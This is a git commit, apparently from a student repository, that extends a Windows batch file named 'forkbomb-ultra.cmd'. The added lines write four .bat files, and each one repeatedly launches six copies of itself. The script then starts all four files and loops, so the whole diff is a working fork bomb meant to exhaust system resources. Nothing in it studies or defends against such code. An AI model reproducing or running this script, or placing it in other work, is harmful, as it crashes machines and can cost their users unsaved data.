e2518b32b8897cf08940b017e361060c1f70a6de
Jaka Černetič <jaka.cernetic@students.vegova.si>
2024-04-03 12:09:15 +0200

    več zadev

--- forkbomb-ultra.cmd
+++ forkbomb-ultra.cmd
@@ -5,4 +5,12 @@ pause
 
 echo :loop > file.bat && echo start file.bat >> file.bat && echo start file.bat >> file.bat &&echo start file.bat >> file.bat &&echo start file.bat >> file.bat && echo start file.bat >> file.bat &&echo start file.bat >> file.bat && echo goto loop >> file.bat
 echo :loop > file2.bat && echo start file2.bat >> file2.bat && echo start file2.bat >> file2.bat &&echo start file2.bat >> file2.bat &&echo start file2.bat >> file2.bat && echo start file2.bat >> file2.bat &&echo start file2.bat >> file2.bat && echo goto loop >> file2.bat
-echo :loop > file3.bat 
+echo :loop > file3.bat && echo start file3.bat >> file3.bat && echo start file3.bat >> file3.bat &&echo start file3.bat >> file3.bat &&echo start file3.bat >> file3.bat && echo start file3.bat >> file3.bat &&echo start file3.bat >> file3.bat && echo goto loop >> file3.bat
+echo :loop > file4.bat && echo start file4.bat >> file4.bat && echo start file4.bat >> file4.bat &&echo start file4.bat >> file4.bat &&echo start file4.bat >> file4.bat && echo start file4.bat >> file4.bat &&echo start file4.bat >> file4.bat && echo goto loop >> file4.bat
+
+start file.bat
+start file2.bat
+start file3.bat
+start file4.bat
+
+goto loop
